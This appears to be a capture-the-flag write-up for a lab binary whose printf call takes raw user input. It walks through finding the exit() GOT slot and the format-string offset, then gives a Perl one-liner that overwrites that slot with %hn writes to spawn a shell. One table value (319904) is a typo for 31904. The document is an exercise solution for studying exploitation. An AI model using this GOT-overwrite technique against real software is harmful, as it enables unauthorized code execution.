# Level 5

## ./level5 code:

```c
//----- (080484A4) --------------------------------------------------------
void __noreturn o()
{
  system("/bin/sh");
  _exit(1);
}
// 80484A4: using guessed type void __noreturn o();

//----- (080484C2) --------------------------------------------------------
void __noreturn n()
{
  char s[520]; // [esp+10h] [ebp-208h] BYREF

  fgets(s, 512, stdin);
  printf(s);
  exit(1);
}

//----- (08048504) --------------------------------------------------------
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  n();
}
```

## goal:

use the printf(s) to change in the GOT table exit() address by o() address. We will write the o() address where exit() address is stored.

## o() address:

on the local computer:

```sh
$ nm level5
    [...]
08048504 T main
080484c2 T n
080484a4 T o
         U printf@@GLIBC_2.0
080483f0 T _start
08049848 B stdin@@GLIBC_2.0
         U system@@GLIBC_2.0
```

o() address is 0x080484a4

## exit() address in the GOT table

```sh
$ objdump -R level5

level5:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049814 R_386_GLOB_DAT    __gmon_start__
08049848 R_386_COPY        stdin
08049824 R_386_JUMP_SLOT   printf
08049828 R_386_JUMP_SLOT   _exit
0804982c R_386_JUMP_SLOT   fgets
08049830 R_386_JUMP_SLOT   system
08049834 R_386_JUMP_SLOT   __gmon_start__
08049838 R_386_JUMP_SLOT   exit
0804983c R_386_JUMP_SLOT   __libc_start_main
```

exit() address is located at 0x08049838

## finding the buffer offset

```sh
$ ./level5 <<< $(perl -e 'print "AAAA" . ".%08x" x 7')
AAAA.00000200.b7fd1ac0.b7ff37d0.41414141.3830252e.30252e78.252e7838
```

buffer offset is 4

## %hn magic number

0x080484a4 will be written in 2 blocks: 0804, 84a4 at address 0x0804983a and 0x08049838 (little endian)

| format | high |    low |
| :----: | :--: | -----: |
|  hex   | 0804 |   84a4 |
|  dec   | 2052 |  33956 |
| offset |  -8  |  -2052 |
| magic  | 2044 | 319904 |

## the hack:

(perl -e 'print "\x3a\x98\x04\x08" . "\x38\x98\x04\x08" . "%2044x%4\$hn" . "%31904x%5\$hn"' ; cat) | ./level5
